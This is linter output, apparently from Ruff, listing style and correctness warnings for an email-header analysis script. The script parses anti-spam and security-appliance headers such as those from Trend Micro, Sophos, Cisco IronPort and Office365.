     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4714 |
4715 |         for svc in service:
     |
help: Remove extraneous `f` prefix

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4760:13
     |
4758 |         self.logger.dbg("Spotted clues about security appliances:")
4759 |
4760 |         for num, header, value in self.headers:
     |             ^^^
4761 |             for (
4762 |                 product,
     |
help: Rename unused `num` to `_num`

N803 Argument name `tenantID` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4803:36
     |
4802 |     @staticmethod
4803 |     def getOffice365TenantNameById(tenantID):
     |                                    ^^^^^^^^
4804 |         url = "https://login.microsoftonline.com/TENANT_ID/oauth2/authorize?client_id=TENANT_ID&response_type=id_token&redirect_uri=ΓÇª
4805 |         url = url.replace("TENANT_ID", tenantID)
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4823:9
     |
4821 |                     return m.group(1)
4822 |
4823 |         except:
     |         ^^^^^^
4824 |             pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4916:16
     |
4914 |             # }
4915 |
4916 |             if "error" in out.keys() and out["error"] != "":
     |                ^^^^^^^^^^^^^^^^^^^^^
4917 |                 m = out["error"]
4918 |                 result += "\t- Office365 Tenant " + self.logger.colored(
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4923:21
     |
4921 |             else:
4922 |                 result += "\t- Office365 Tenant " + self.logger.colored(
4923 |                     f"exists.", "yellow"
     |                     ^^^^^^^^^^
4924 |                 )
     |
help: Remove extraneous `f` prefix

B007 Loop control variable `num1` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4935:21
     |
4934 |                 num0 = 0
4935 |                 for num1, header1, value1 in self.headers:
     |                     ^^^^
4936 |                     value1 = SMTPHeadersAnalysis.flattenLine(value1).strip()
4937 |                     if (
     |
help: Rename unused `num1` to `_num1`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4960:9
     |
4958 |                     result += "\n" + tmp + "\n"
4959 |
4960 |         except:
     |         ^^^^^^
4961 |             self.logger.err(
4962 |                 f"Could not fetch Office365 tenant OpenID configuration. Use --debug for more details."
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4962:17
     |
4960 |         except:
4961 |             self.logger.err(
4962 |                 f"Could not fetch Office365 tenant OpenID configuration. Use --debug for more details."
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4963 |             )
4964 |             result += self.logger.colored(
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4997:16
     |
4995 |             out = r.json()
4996 |
4997 |             if "error" in out.keys() and out["error"] != "":
     |                ^^^^^^^^^^^^^^^^^^^^^
4998 |                 m = out["error"]
4999 |                 return []
     |
help: Remove `.keys()`

F841 Local variable `m` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:4998:17
     |
4997 |             if "error" in out.keys() and out["error"] != "":
4998 |                 m = out["error"]
     |                 ^
4999 |                 return []
     |
help: Remove assignment to unused variable `m`

B007 Loop control variable `num1` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5013:17
     |
5012 |             num0 = 0
5013 |             for num1, header1, value1 in self.headers:
     |                 ^^^^
5014 |                 value1 = SMTPHeadersAnalysis.flattenLine(value1).strip()
5015 |                 if (
     |
help: Rename unused `num1` to `_num1`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5040:9
     |
5038 |                 result += "\n" + tmp + "\n"
5039 |
5040 |         except:
     |         ^^^^^^
5041 |             self.logger.err(f"Could not fetch Office365 tenant OpenID configuration.")
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5041:29
     |
5040 |         except:
5041 |             self.logger.err(f"Could not fetch Office365 tenant OpenID configuration.")
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5042 |
5043 |         return {
     |
help: Remove extraneous `f` prefix

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5075:21
     |
5073 |                       if v.lower() == "notspam":
5074 |                           col = "green"
5075 | /                     elif v.lower() == "spam":
5076 | |                         col = "red"
5077 | |                     elif "definitive" in v.lower():
5078 | |                         col = "red"
     | |___________________________________^
5079 |                       elif "malware" in v.lower():
5080 |                           col = "red"
     |
help: Combine `if` branches

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5077:21
     |
5075 |                       elif v.lower() == "spam":
5076 |                           col = "red"
5077 | /                     elif "definitive" in v.lower():
5078 | |                         col = "red"
5079 | |                     elif "malware" in v.lower():
5080 | |                         col = "red"
     | |___________________________________^
5081 |                       elif "phish" in v.lower():
5082 |                           col = "red"
     |
help: Combine `if` branches

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5079:21
     |
5077 |                       elif "definitive" in v.lower():
5078 |                           col = "red"
5079 | /                     elif "malware" in v.lower():
5080 | |                         col = "red"
5081 | |                     elif "phish" in v.lower():
5082 | |                         col = "red"
     | |___________________________________^
5083 |                       elif "quarantine" in v.lower():
5084 |                           col = "red"
     |
help: Combine `if` branches

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5081:21
     |
5079 |                       elif "malware" in v.lower():
5080 |                           col = "red"
5081 | /                     elif "phish" in v.lower():
5082 | |                         col = "red"
5083 | |                     elif "quarantine" in v.lower():
5084 | |                         col = "red"
     | |___________________________________^
5085 |
5086 |                       v = self.logger.colored(v.upper(), col)
     |
help: Combine `if` branches

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5099:21
     |
5097 |                             v = self.logger.colored(v, "green")
5098 |
5099 |                     except:
     |                     ^^^^^^
5100 |                         pass
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5132:9
     |
5130 |           (num1, header1, value1) = self.getHeader("From")
5131 |
5132 | /         if header1 and value1:
5133 | |             if value.lower() not in value1.lower():
     | |___________________________________________________^
5134 |                   result += f'\n\t- {self.logger.colored("Mismatch with From header!", "red")}\n'
5135 |                   result += f"\t\t- Authenticated user is not the same as declared in From header:\n\n"
     |
help: Combine `if` statements using `and`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5135:27
     |
5133 |             if value.lower() not in value1.lower():
5134 |                 result += f'\n\t- {self.logger.colored("Mismatch with From header!", "red")}\n'
5135 |                 result += f"\t\t- Authenticated user is not the same as declared in From header:\n\n"
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5136 |                 result += (
5137 |                     f'\t\t\t- Authenticated as:\t{self.logger.colored(value, "red")}\n'
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5155:12
     |
5153 |         result = f'- n-able Mail Assure (SpamExperts) Class: {self.logger.colored(value, "yellow")}\n'
5154 |
5155 |         if value.lower() in SMTPHeadersAnalysis.SpamExperts_Classes.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5156 |             result += (
5157 |                 f"\n\t- {value}: "
     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5204:13
     |
5202 |                 result += f"\t- Verdict: {msg}\n"
5203 |
5204 |             except:
     |             ^^^^^^
5205 |                 pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5223:12
     |
5221 |         result = f'- n-able Mail Assure (SpamExperts) Recommended Action on e-mail: {self.logger.colored(value, "yellow")}\n'
5222 |
5223 |         if value.lower() in SMTPHeadersAnalysis.SpamExperts_Actions.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5224 |             result += (
5225 |                 f"\n\t- {value}: "
     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5268:9
     |
5266 |         try:
5267 |             score = float(value.strip())
5268 |         except:
     |         ^^^^^^
5269 |             return ""
     |

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5329:13
     |
5327 |         )
5328 |
5329 |         for num, header, value in self.headers:
     |             ^^^
5330 |             headers.add(header.lower())
     |
help: Rename unused `num` to `_num`

B007 Loop control variable `value` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5329:26
     |
5327 |         )
5328 |
5329 |         for num, header, value in self.headers:
     |                          ^^^^^
5330 |             headers.add(header.lower())
     |
help: Rename unused `value` to `_value`

N806 Variable `foundWords` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5343:9
     |
5342 |     def _findSuspiciousWords(self, num, header, value):
5343 |         foundWords = set()
     |         ^^^^^^^^^^
5344 |         totalChecked = 0
5345 |         totalFound = 0
     |

N806 Variable `totalChecked` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5344:9
     |
5342 |     def _findSuspiciousWords(self, num, header, value):
5343 |         foundWords = set()
5344 |         totalChecked = 0
     |         ^^^^^^^^^^^^
5345 |         totalFound = 0
     |

N806 Variable `totalFound` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5345:9
     |
5343 |         foundWords = set()
5344 |         totalChecked = 0
5345 |         totalFound = 0
     |         ^^^^^^^^^^
5346 |
5347 |         result = ""
     |

N806 Variable `totalChecked` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5358:17
     |
5356 |                     continue
5357 |
5358 |                 totalChecked += 1
     |                 ^^^^^^^^^^^^
5359 |                 m = re.search(r"\b(" + re.escape(word) + r")\b", value, re.I)
5360 |                 if m:
     |

N806 Variable `totalFound` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5380:17
     |
5379 | ΓÇª     if len(found) > 0:
5380 | ΓÇª         totalFound += len(found)
     |           ^^^^^^^^^^
5381 | ΓÇª         result += f'- Found {logger.colored(len(found), "red")} {logger.colored(title, "yellow")} words {logger.colored(words[0], ΓÇª
     |

F405 `datetime` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5434:15
     |
5433 |         ts = int(value.strip())
5434 |         val = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
     |               ^^^^^^^^
5435 |
5436 |         result = f'- Barracuda Email Security Start Time: {self.logger.colored(val, "green")} ({ts})\n'
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5580:9
     |
5578 |                 result += f"\t- {rule}\n"
5579 |
5580 |         except:
     |         ^^^^^^
5581 |             result = (
5582 |                 f"- Trend Micro Anti-Spam triggered following rules on this e-mail:\n\n"
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5582:17
     |
5580 |         except:
5581 |             result = (
5582 |                 f"- Trend Micro Anti-Spam triggered following rules on this e-mail:\n\n"
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5583 |             )
5584 |             result += f"{value}\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5612:23
     |
5610 |             result += f"\t- Scan Aggressive Level: {parts[2]}\n"
5611 |         if len(parts) > 3:
5612 |             result += f"\t- Traverse List:"
     |                       ^^^^^^^^^^^^^^^^^^^^^
5613 |
5614 |             if "," in parts[3]:
     |
help: Remove extraneous `f` prefix

N803 Argument name `topicLine` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5694:32
     |
5692 |         return self._parseTMASResult(result, "", num, header, value)
5693 |
5694 |     def _parseTMASResult(self, topicLine, description, num, header, value):
     |                                ^^^^^^^^^
5695 |         value = value.replace("--", "-=")
5696 |         parts = value.split("-")
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5704:13
     |
5702 |             try:
5703 |                 thresh = float(parts[2])
5704 |             except:
     |             ^^^^^^
5705 |                 pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5715:13
     |
5713 |             try:
5714 |                 score = float(score)
5715 |             except:
     |             ^^^^^^
5716 |                 pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5757:20
     |
5755 |             try:
5756 |                 t = int(parts[4])
5757 |                 if t in SMTPHeadersAnalysis.Trend_Type_AntiSpam.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5758 |                     result += "  (" + SMTPHeadersAnalysis.Trend_Type_AntiSpam[k] + ")"
5759 |             except:
     |
help: Remove `.keys()`

F405 `k` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5758:79
     |
5756 |                 t = int(parts[4])
5757 |                 if t in SMTPHeadersAnalysis.Trend_Type_AntiSpam.keys():
5758 |                     result += "  (" + SMTPHeadersAnalysis.Trend_Type_AntiSpam[k] + ")"
     |                                                                               ^
5759 |             except:
5760 |                 pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5759:13
     |
5757 |                 if t in SMTPHeadersAnalysis.Trend_Type_AntiSpam.keys():
5758 |                     result += "  (" + SMTPHeadersAnalysis.Trend_Type_AntiSpam[k] + ")"
5759 |             except:
     |             ^^^^^^
5760 |                 pass
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5836:18
     |
5834 |             return []
5835 |
5836 |         result = f"- Cloudmark Authority Engine (CMAE) analysis results:\n\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5837 |         value = SMTPHeadersAnalysis.flattenLine(value)
     |
help: Remove extraneous `f` prefix

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5850:16
     |
5848 |             v = part[pos + 1 :]
5849 |
5850 |             if k in parts.keys():
     |                ^^^^^^^^^^^^^^^^^
5851 |                 if not (type(parts[k]) == type([])):
5852 |                     parts[k] = [parts[k], v]
     |
help: Remove `.keys()`

SIM201 Use `type(parts[k]) != type([])` instead of `not type(parts[k]) == type([])`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5851:20
     |
5850 |             if k in parts.keys():
5851 |                 if not (type(parts[k]) == type([])):
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5852 |                     parts[k] = [parts[k], v]
5853 |                 else:
     |
help: Replace with `!=` operator

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5851:25
     |
5850 |             if k in parts.keys():
5851 |                 if not (type(parts[k]) == type([])):
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
5852 |                     parts[k] = [parts[k], v]
5853 |                 else:
     |

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5861:16
     |
5860 |         for k, v in parts.items():
5861 |             if "v" == k:
     |                ^^^^^^^^
5862 |                 result += f'\t- Version:\t\t{parts["v"]}\n'
     |
help: Rewrite as `k == "v"`

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5864:18
     |
5862 |                 result += f'\t- Version:\t\t{parts["v"]}\n'
5863 |
5864 |             elif "ts" == k:
     |                  ^^^^^^^^^
5865 |                 try:
5866 |                     ts = int(parts["ts"], 16)
     |
help: Rewrite as `k == "ts"`

F405 `datetime` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5867:27
     |
5865 |                 try:
5866 |                     ts = int(parts["ts"], 16)
5867 |                     ts2 = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
     |                           ^^^^^^^^
5868 |                     result += f"\t- Timestamp:\t\t{ts2}\n"
     |

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5870:37
     |
5868 |                     result += f"\t- Timestamp:\t\t{ts2}\n"
5869 |
5870 |                 except Exception as e:
     |                                     ^
5871 |                     raise
     |
help: Remove assignment to unused variable `e`

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5873:18
     |
5871 |                     raise
5872 |
5873 |             elif "p" == k:
     |                  ^^^^^^^^
5874 |                 result += f'\t- {self.logger.colored("Possible SPAM", "red")}:\t{parts["v"]}\n'
     |
help: Rewrite as `k == "p"`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5877:20
     |
5876 |             else:
5877 |                 if type(v) == type([]):
     |                    ^^^^^^^^^^^^^^^^^^^
5878 |                     result += (
5879 |                         f'\t- {self.logger.colored(k, "magenta")} ({len(v)} entries):\n'
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5894:33
     |
5892 |                                     a1 += f"\n\t\t\t{hd} ...\n"
5893 |
5894 |                                 except:
     |                                 ^^^^^^
5895 |                                     pass
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5918:18
     |
5916 |             return []
5917 |
5918 |         result = f"- SPF Check:\n"
     |                  ^^^^^^^^^^^^^^^^^
5919 |         for line in value.split(","):
5920 |             result += f"\t- {line.strip()}\n"
     |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5944:13
     |
5942 |                 result += f"\t- Priority:    {p2}\n"
5943 |
5944 |             except:
     |             ^^^^^^
5945 |                 result += f"\t- Priority:    {parts[0]}\n"
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5966:18
     |
5964 |             return []
5965 |
5966 |         result = f"- Message was scanned with an Anti-Virus."
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5967 |         self.addSecurityAppliance("Unknown Anti-Virus")
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5981:18
     |
5979 |             return []
5980 |
5981 |         result = f"- Message was scanned with FireEye Email Security Solution. Result is following:\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5982 |         self.addSecurityAppliance("FireEye Email Security Solution")
5983 |         result += f'\t- {self.logger.colored(value, "green")}\n'
     |
help: Remove extraneous `f` prefix

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:5998:13
     |
5996 |         SMTPHeadersAnalysis.Handled_Spam_Headers.append("x-antiabuse")
5997 |
5998 |         for num, header, value in self.headers:
     |             ^^^
5999 |             if header.lower() != "x-antiabuse":
6000 |                 continue
     |
help: Rename unused `num` to `_num`

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6025:13
     |
6023 |         tmp = ""
6024 |
6025 |         for num, header, value in self.headers:
     |             ^^^
6026 |             if header in shown or header in SMTPHeadersAnalysis.Handled_Spam_Headers:
6027 |                 continue
     |
help: Rename unused `num` to `_num`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6074:18
     |
6072 |             return []
6073 |
6074 |         result = f"- Cisco IronPort observed following IP of the connecting Client: "
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6075 |         self.addSecurityAppliance("Cisco IronPort")
6076 |         return self._originatingIPTest(result, "", num, header, value)
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6083:18
     |
6081 |             return []
6082 |
6083 |         result = f"- E-Mail sent through Amazon SES. Outgoing: \n\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6084 |         vals = SMTPHeadersAnalysis.flattenLine(value).replace(" ", "").split("-")
     |
help: Remove extraneous `f` prefix

N803 Argument name `topicLine` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6090:34
     |
6088 |         return self._originatingIPTest(result, "", num, header, vals[1])
6089 |
6090 |     def _originatingIPTest(self, topicLine, description, num, header, value):
     |                                  ^^^^^^^^^
6091 |         result = ""
     |

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6093:12
     |
6091 |         result = ""
6092 |
6093 |         if "[" == value[0] and value[-1] == "]":
     |            ^^^^^^^^^^^^^^^
6094 |             value = value[1:-1]
     |
help: Rewrite as `value[0] == "["`

F405 `value` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6130:45
     |
6128 |         m1 = re.search(r"\=\?[a-z0-9\-]+\?Q\?", v1, re.I)
6129 |         if m1:
6130 |             v1d = emailheader.decode_header(value)[0][0]
     |                                             ^^^^^
6131 |             if type(v1d) == bytes:
6132 |                 v1d = v1d.decode(errors="ignore")
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6131:16
     |
6129 |         if m1:
6130 |             v1d = emailheader.decode_header(value)[0][0]
6131 |             if type(v1d) == bytes:
     |                ^^^^^^^^^^^^^^^^^^
6132 |                 v1d = v1d.decode(errors="ignore")
6133 |             v1 = v1d
     |

F405 `value` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6137:45
     |
6135 |         m2 = re.search(r"\=\?[a-z0-9\-]+\?Q\?", v2, re.I)
6136 |         if m2:
6137 |             v2d = emailheader.decode_header(value)[0][0]
     |                                             ^^^^^
6138 |             if type(v2d) == bytes:
6139 |                 v2d = v2d.decode(errors="ignore")
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6138:16
     |
6136 |         if m2:
6137 |             v2d = emailheader.decode_header(value)[0][0]
6138 |             if type(v2d) == bytes:
     |                ^^^^^^^^^^^^^^^^^^
6139 |                 v2d = v2d.decode(errors="ignore")
6140 |             v2 = v2d
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6157:18
     |
6155 |             return []
6156 |
6157 |         result = f"- Sophos Email Appliance Spam report:\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6158 |         self.addSecurityAppliance("Sophos Email Appliance (PureMessage)")
6159 |         report = {}
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6193:16
     |
6191 |             k = self.logger.colored(key, "cyan")
6192 |
6193 |             if key.lower() in SMTPHeadersAnalysis.SEA_Spam_Fields.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6194 |                 result += f"\n\t- {k}:     {SMTPHeadersAnalysis.SEA_Spam_Fields[key.lower()]}\n"
6195 |             else:
     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6214:25
     |
6212 |                         try:
6213 |                             num2 = float(num)
6214 |                         except:
     |                         ^^^^^^
6215 |                             pass
6216 |                     else:
     |

N806 Variable `numX` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6234:17
     |
6232 |             elif key.lower() == "gauge":
6233 |                 leng = len(val)
6234 |                 numX = val.lower().count("x")
     |                 ^^^^
6235 |                 numI = val.lower().count("i")
6236 |                 others = leng - numX - numI
     |

N806 Variable `numI` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6235:17
     |
6233 |                 leng = len(val)
6234 |                 numX = val.lower().count("x")
6235 |                 numI = val.lower().count("i")
     |                 ^^^^
6236 |                 others = leng - numX - numI
     |

N806 Variable `probX` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6238:17
     |
6236 |                 others = leng - numX - numI
6237 |
6238 |                 probX = (float(numX) / leng) * 100.0
     |                 ^^^^^
6239 |                 probI = (float(numI) / leng) * 100.0
6240 |                 probOthers = (float(others) / leng) * 100.0
     |

N806 Variable `probI` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6239:17
     |
6238 |                 probX = (float(numX) / leng) * 100.0
6239 |                 probI = (float(numI) / leng) * 100.0
     |                 ^^^^^
6240 |                 probOthers = (float(others) / leng) * 100.0
     |

N806 Variable `probOthers` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6240:17
     |
6238 |                 probX = (float(numX) / leng) * 100.0
6239 |                 probI = (float(numI) / leng) * 100.0
6240 |                 probOthers = (float(others) / leng) * 100.0
     |                 ^^^^^^^^^^
6241 |
6242 |                 result += (
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6252:18
     |
6250 |                 )
6251 |
6252 |             elif type(val) == list or type(val) == tuple:
     |                  ^^^^^^^^^^^^^^^^^
6253 |                 result += f'\t     Contains {self.logger.colored(len(val), "yellow")} elements.\n'
6254 |                 for rule in val:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6252:39
     |
6250 |                 )
6251 |
6252 |             elif type(val) == list or type(val) == tuple:
     |                                       ^^^^^^^^^^^^^^^^^^
6253 |                 result += f'\t     Contains {self.logger.colored(len(val), "yellow")} elements.\n'
6254 |                 for rule in val:
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6274:18
     |
6272 |             return []
6273 |
6274 |         result = f"- SpamDiagnosticMetadata: Antispam stamps in Exchange Server 2016.\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6275 |         self.addSecurityAppliance("Exchange Server 2016 Anti-Spam")
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6277:12
     |
6275 |         self.addSecurityAppliance("Exchange Server 2016 Anti-Spam")
6276 |
6277 |         if value.strip() in SMTPHeadersAnalysis.Spam_Diagnostics_Metadata.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6278 |             result += (
6279 |                 f"     {value}: "
     |
help: Remove `.keys()`

